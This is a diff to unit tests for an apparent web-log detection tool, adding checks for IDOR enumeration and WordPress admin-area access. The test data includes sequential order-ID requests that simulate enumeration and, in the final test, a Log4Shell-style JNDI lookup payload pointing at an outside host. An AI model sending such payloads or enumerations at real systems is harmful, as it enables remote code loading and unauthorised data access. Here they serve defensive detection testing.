@@ -270,8 +270,31 @@ class ExternalChainTests(unittest.TestCase):
         lines = "\n".join(
             f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /order.php?id={i} HTTP/1.1" 200 300 "-" "x"'
             for i in range(1, 13))
-        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        rules = {f.rule for f in webdetect.run_web_detections(
+            weblog.parse_access(lines), SiteProfile(private_object_paths=["/order.php"]))}
         self.assertIn("WEBLOG_IDOR_ENUM", rules)
+        # 경로를 프로필에 적지 않으면 끈다(상품 목록 넘겨 보기와 구별할 수 없음)
+        rules = {f.rule for f in webdetect.run_web_detections(weblog.parse_access(lines), SiteProfile())}
+        self.assertNotIn("WEBLOG_IDOR_ENUM", rules)
+
+    def test_idor_route_pattern(self):
+        lines = "\n".join(
+            f'198.51.100.9 - - [10/Oct/2026:13:55:{i:02d} +0000] "GET /api/orders/{1000 + i} HTTP/1.1" 200 300 "-" "x"'
+            for i in range(10))
+        prof = SiteProfile(private_object_paths=["/api/orders/{id}"])
+        fs = [f for f in webdetect.run_web_detections(weblog.parse_access(lines), prof) if f.rule == "WEBLOG_IDOR_ENUM"]
+        self.assertEqual(len(fs), 1)
+        self.assertIn("/api/orders/{id}", fs[0].detail)
+
+    def test_wp_admin_is_admin_area(self):
+        # 예전에는 /admin으로 시작하는 경로만 관리자 영역으로 봐서 /wp-admin 접근을 놓쳤다
+        line = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-admin/users.php HTTP/1.1" 200 900 "-" "x"'
+        self.assertIn("WEBLOG_ADMIN_ACCESS", self._rules(line, SiteProfile()))
+        login = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "GET /wp-login.php HTTP/1.1" 200 900 "-" "x"'
+        self.assertNotIn("WEBLOG_ADMIN_ACCESS", self._rules(login, SiteProfile()))  # 로그인 화면은 아님
+        # 방문자 브라우저가 늘 부르는 WordPress AJAX 창구는 관리자 접근이 아니다(AIT 측정의 오탐 475줄)
+        ajax = '198.51.100.9 - - [10/Oct/2026:13:55:40 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 90 "-" "x"'
+        self.assertNotIn("WEBLOG_ADMIN_ACCESS", self._rules(ajax, SiteProfile()))
 
     def test_probe_strings_in_user_agent(self):
         self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="${jndi:ldap://198.51.100.99/a}")))
